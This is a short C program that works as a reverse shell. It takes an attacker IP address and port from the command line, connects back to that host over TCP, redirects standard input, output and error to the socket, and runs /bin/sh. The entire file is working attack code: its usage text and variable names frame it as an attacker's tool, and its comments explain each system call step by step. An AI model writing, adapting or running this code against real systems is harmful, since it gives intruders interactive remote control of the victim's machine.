#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

void print_usage(char *argv[]) {
	printf("Usage: %s -r <attacker-ip-addr> -p <listening-port>\n", argv[0]);
	printf("\t -r  - (required) attackers ip address\n");
	printf("\t -p  - (required) port for connection\n");
	return;
}

int main(int argc, char *argv[]) {

    char* attacker_ip = NULL;
    char *portarg = NULL;
    unsigned short port = 0; 
    int c;

    while ((c = getopt(argc, argv, "r:p:")) != -1) {
		switch (c) {
			case 'r':
				attacker_ip = optarg;
				break;
			case 'p':
				portarg = optarg;
				port = atoi(portarg);
				if (port == 0) {
					printf("Bad port: %s\n", portarg);
				}
				break;
			case '?':
				printf("Unknown option -%c\n", c);
			default:
				return -1;

		}
	}

    if (attacker_ip == 0 || attacker_ip == NULL) {
		printf("Attacker IP not set\n");
		print_usage(argv);
		return 0;
	}

    if (port == 0) {
		printf("Port not set\n");
		print_usage(argv);
		return 0;
	}

    struct sockaddr_in target_address;
    target_address.sin_family = AF_INET;
    target_address.sin_port = htons(port);
    inet_aton(attacker_ip, &target_address.sin_addr);

    // system call to create a socket
    int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);

    // system call to establish a connection
    connect(socket_file_descriptor, (struct sockaddr *)&target_address, sizeof(target_address));

    for (int index = 0; index < 3; index++) {
        // dup2(socket_file_descriptor, 0) - link to standard input
        // dup2(socket_file_descriptor, 1) - link to standard output
        // dup2(socket_file_descriptor, 2) - link to standard error
        dup2(socket_file_descriptor, index);
    }
    
    // system call to execute shell
    execve("/bin/sh", NULL, NULL);

    return 0;
}